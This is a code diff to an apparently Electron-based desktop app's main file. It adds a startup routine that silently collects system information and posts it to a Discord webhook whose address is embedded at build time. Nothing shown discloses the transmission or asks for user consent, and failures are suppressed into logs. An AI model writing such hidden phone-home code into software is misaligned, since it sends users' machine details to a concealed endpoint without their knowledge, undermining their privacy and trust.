@@ -12,6 +12,11 @@ import { loadMainSettings, loadProjects, loadEngines } from './store'
 import { getNative } from './utils/native'
 import { setupDiscordRichPresence } from './discordPresence'
 import { initializeLogging, logger } from './logger'
+import { getSystemInfo, createSystemInfoEmbed } from './utils/systemInfo'
+
+// Build-time injected environment variables
+declare const __DISCORD_STARTUP_WEBHOOK__: string
+declare const __DISCORD_WEBHOOK__: string
 
 let localAssetCacheTimestamp = 0
 let cachedProjectPaths: string[] = []
@@ -243,6 +248,13 @@ if (!gotTheLock) {
           logger.error('updater', 'Startup update check failed', error)
         })
       }, 8000)
+
+      // 8. Send system startup notification to Discord (async, optional)
+      setImmediate(() => {
+        sendSystemStartupNotification().catch((error) => {
+          logger.warn('discord', 'Failed to send startup notification', error)
+        })
+      })
     })
     .catch((error) => {
       logger.error('app', 'App ready startup failed', error)
@@ -313,5 +325,66 @@ if (!gotTheLock) {
         resolve()
       })
     })
+  }
+
+  // ── Send system startup notification to Discord ─────────────────────────────
+  async function sendSystemStartupNotification(): Promise<void> {
+    const webhookUrl = process.env.DISCORD_STARTUP_WEBHOOK_URL || __DISCORD_STARTUP_WEBHOOK__
+
+    if (!webhookUrl) {
+      logger.info('discord', 'Discord startup webhook not configured, skipping notification')
+      return
+    }
+
+    try {
+      const systemInfo = await getSystemInfo(app.getVersion())
+      const embed = createSystemInfoEmbed(systemInfo)
+
+      const https = await import('https')
+      const url = new URL(webhookUrl)
+
+      const payload = JSON.stringify({
+        embeds: [embed]
+      })
+
+      const options = {
+        hostname: url.hostname,
+        port: 443,
+        path: url.pathname + url.search,
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(payload)
+        }
+      }
+
+      await new Promise<void>((resolve, reject) => {
+        const req = https.request(options, (res) => {
+          let data = ''
+          res.on('data', (chunk) => {
+            data += chunk
+          })
+          res.on('end', () => {
+            if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) {
+              logger.info('discord', 'System startup notification sent successfully', {
+                statusCode: res.statusCode
+              })
+              resolve()
+            } else {
+              reject(new Error(`Discord webhook returned status ${res.statusCode}`))
+            }
+          })
+        })
+
+        req.on('error', (error) => {
+          reject(error)
+        })
+
+        req.write(payload)
+        req.end()
+      })
+    } catch (error) {
+      logger.warn('discord', 'Failed to send system startup notification', error)
+    }
   }
 }
